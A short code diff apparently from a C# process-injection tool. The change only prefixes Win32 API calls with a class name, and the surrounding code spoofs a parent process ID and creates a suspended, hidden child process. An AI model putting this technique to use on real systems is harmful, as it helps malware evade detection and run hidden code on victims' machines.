@@ -34,7 +34,7 @@ namespace ProcessInjection
       siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
       Win32.InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);
 
-      IntPtr parentHandle = OpenProcess((uint)Win32.ProcessAccessFlags.CreateProcess | (uint)Win32.ProcessAccessFlags.DuplicateHandle, false, (uint)parentID);
+      IntPtr parentHandle = Win32.OpenProcess((uint)Win32.ProcessAccessFlags.CreateProcess | (uint)Win32.ProcessAccessFlags.DuplicateHandle, false, (uint)parentID);
       Console.WriteLine($"[>] Handle {parentHandle} opened for parent process id.");
 
       lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
@@ -46,13 +46,13 @@ namespace ProcessInjection
       siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
       siEx.StartupInfo.wShowWindow = SW_HIDE;
 
-      var ps = new SECURITY_ATTRIBUTES();
-      var ts = new SECURITY_ATTRIBUTES();
+      var ps = new Win32.SECURITY_ATTRIBUTES();
+      var ts = new Win32.SECURITY_ATTRIBUTES();
       ps.nLength = Marshal.SizeOf(ps);
       ts.nLength = Marshal.SizeOf(ts);
 
       try {
-        bool ProcCreate = CreateProcess(childPath, null, ref ps, ref ts, true, CreateSuspended | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
+        bool ProcCreate = Win32.CreateProcess(childPath, null, ref ps, ref ts, true, CreateSuspended | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
         if (!ProcCreate) {
           Console.WriteLine($"[!] Proccess failed to execute!");
           throw new System.Exception("Process parent failed to start");
